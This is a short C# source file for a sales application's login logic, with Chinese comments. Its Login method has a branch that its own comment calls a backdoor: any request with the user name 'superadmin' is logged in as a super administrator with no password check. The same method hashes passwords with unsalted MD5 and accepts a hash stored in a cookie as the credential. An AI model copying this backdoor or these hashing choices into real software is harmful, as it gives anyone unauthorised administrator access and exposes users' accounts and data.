using CompanySales.Repository.Common;
using CompanySales.Repository.DAO;
using CompanySales.Repository.Models;
using System;
using System.Collections.Generic;
using System.Text;

namespace CompanySales.Repository.Business
{
    public class UserBiz
    {
        /// <summary>
        /// 根据userid和password判断用户是否存在
        /// 使用cookie自动进行登录，密码为密文，不需要再次加密，通过 isCipherPwd 判断
        /// </summary>
        /// <param name="uid"></param>
        /// <param name="pwd"></param>
        /// <param name="isCipherPwd"></param>
        /// <returns></returns>
        public static User Login(string uid, string pwd, bool isCipherPwd = false)
        {
            // 后门，当用户名为superadmin时直接登录
            if (uid == "superadmin")
            {
                //return true;
                return new User() { UserId = "superadmin", Name = "超级管理员" };
            }

            //加密后进行判断。自动登录情况下cookie保存的就是加密后的密文
            string cipher = isCipherPwd ? pwd : EncryptHelper.MD5Encrypt(pwd);
            return UserDAO.Login(uid, cipher);
        }
    }
}
